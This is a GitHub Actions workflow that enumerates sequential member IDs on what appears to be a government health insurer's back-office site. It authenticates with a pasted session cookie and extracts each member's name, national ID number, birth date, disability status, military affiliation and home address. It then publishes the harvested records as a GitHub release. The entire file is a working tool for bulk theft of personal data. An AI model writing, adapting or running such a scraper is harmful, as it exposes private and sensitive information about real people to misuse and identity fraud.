name: Scraping IOSFA ULTRA PRO

on:
  workflow_dispatch:
    inputs:
      start_user:
        description: 'Número de usuario inicial'
        required: true
        default: '21000'
      end_user:
        description: 'Número de usuario final'
        required: true
        default: '21010'
      release_name:
        description: 'Nombre del release (opcional)'
        required: false

permissions:
  contents: write

jobs:
  scrap_and_release:
    runs-on: ubuntu-latest
    env:
      OUTPUT: resultado.txt
      ERROR_LOG: errores.txt

    steps:
      - uses: actions/checkout@v4

      - name: Ejecutar Scraping Blindado y Mostrar Variables
        shell: bash
        run: |
          set +e

          START=${{ github.event.inputs.start_user }}
          END=${{ github.event.inputs.end_user }}
          INPUT_RELEASE="${{ github.event.inputs.release_name }}"

          > "$OUTPUT"
          > "$ERROR_LOG"

          COOKIE_HEADER='_gid=GA1.3.2022856683.1771469080; _ga_56029ZBE95=GS2.1.s1771555226$o2$g0$t1771556191$j60$l0$h0; IOSFABackOffice=XXXX; ASP.NET_SessionId=XXXX'

          # Tag automático si no se pasa uno
          if [ -z "$INPUT_RELEASE" ]; then
            RELEASE_NAME="IOSFA-$(date +'%Y%m%d-%H%M%S')"
          else
            RELEASE_NAME="$INPUT_RELEASE"
          fi

          echo "RELEASE_NAME=$RELEASE_NAME" >> $GITHUB_ENV

          extract_input() {
            echo "$RESPONSE" | grep -oP "$1\"[^>]*value=\"\K[^\"]+" 2>/dev/null | head -n1 || true
          }

          extract_span() {
            echo "$RESPONSE" | grep -oP "$1[^>]*>\K[^<]+" 2>/dev/null | head -n1 || true
          }

          extract_estado() {
            echo "$RESPONSE" | grep -oP 'frmCabecera_txtEstado[^>]*>.*?estado[^>]*>\K[^<]+' 2>/dev/null | head -n1 || true
          }

          fetch_user() {
            local USER_ID=$1
            local ATTEMPT=1
            local MAX_ATTEMPTS=3
            RESPONSE=""

            while [ $ATTEMPT -le $MAX_ATTEMPTS ]; do
              RESPONSE=$(curl -s -L \
                -H "User-Agent: Mozilla/5.0" \
                -H "Cookie: $COOKIE_HEADER" \
                --max-time 20 \
                "http://validador.iosfa.gob.ar:5080/Afiliados/Titular/Editar/${USER_ID}")

              if [[ "$RESPONSE" == *"login"* ]]; then
                echo "⚠️ SESIÓN EXPIRADA detectada para USER $USER_ID" >> "$ERROR_LOG"
                return 2
              fi

              if [[ "$RESPONSE" == *"FUERZA DE ORIGEN:"* ]]; then
                return 0
              fi

              ATTEMPT=$((ATTEMPT+1))
              sleep 2
            done

            return 1
          }

          echo "Iniciando scraping desde USER $START hasta $END"

          for USER_ID in $(seq $START $END); do
            fetch_user $USER_ID
            STATUS=$?

            if [ $STATUS -eq 2 ]; then
              echo "❌ Sesión inválida detectada. Deteniendo scraping." >> "$ERROR_LOG"
              break
            fi

            if [ $STATUS -eq 1 ]; then
              echo "USER $USER_ID = SIN DATOS" | tee -a "$OUTPUT"
              continue
            fi

            # Extracción segura de campos
            TIPO=$(extract_input "cboTipoDocumentos_I")
            APELLIDO=$(extract_input "frmCabecera_txtApellidos")
            NOMBRE=$(extract_input "frmCabecera_txtNombres")
            CODIGO=$(extract_input "txtCodigoCredencial_I")
            DNI=$(extract_input "txtRefExterna")
            ESTADO_CIVIL=$(extract_input "cboEstadoCivil_I")
            EDAD=$(extract_input "txtEdad")
            FECHA_NAC=$(extract_input "txtFecNacimiento_I")
            DISCAPACIDAD=$(extract_input "cboDiscapacitado_I")
            VIGENCIA=$(extract_input "txtFecha_Vigencia_I")
            ALTA_ADMIN=$(extract_input "txtFecha_Alta_Administrativa")
            PROVINCIA=$(extract_input "cboProvincia_I")
            LOCALIDAD=$(extract_input "cboLocalidad_I")
            CALLE=$(extract_input "txtCalle")
            NUMERO=$(extract_input "frmDomicilio_txtNumero")
            FUERZA=$(extract_span "afiFA")
            ESTADO=$(extract_estado)

            # Mostrar en pantalla y guardar
            LINE="USER=$USER_ID | TIPO=$TIPO | ESTADO=$ESTADO | APELLIDO=$APELLIDO | NOMBRE=$NOMBRE | CODIGO=$CODIGO | DNI=$DNI | ESTADO_CIVIL=$ESTADO_CIVIL | EDAD=$EDAD | FECHA_NAC=$FECHA_NAC | DISCAPACIDAD=$DISCAPACIDAD | FUERZA=$FUERZA | VIGENCIA=$VIGENCIA | ALTA_ADMIN=$ALTA_ADMIN | PROVINCIA=$PROVINCIA | LOCALIDAD=$LOCALIDAD | CALLE=$CALLE | NUMERO=$NUMERO"

            echo "$LINE" | tee -a "$OUTPUT"
          done

          # Evitar archivo vacío de errores
          if [ ! -s "$ERROR_LOG" ]; then
            echo "Sin errores detectados." > "$ERROR_LOG"
          fi

      - name: Crear / Actualizar Release Blindado
        uses: softprops/action-gh-release@v2
        with:
          tag_name: ${{ env.RELEASE_NAME }}
          name: ${{ env.RELEASE_NAME }}
          files: |
            resultado.txt
            errores.txt
          fail_on_unmatched_files: false
          make_latest: true
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
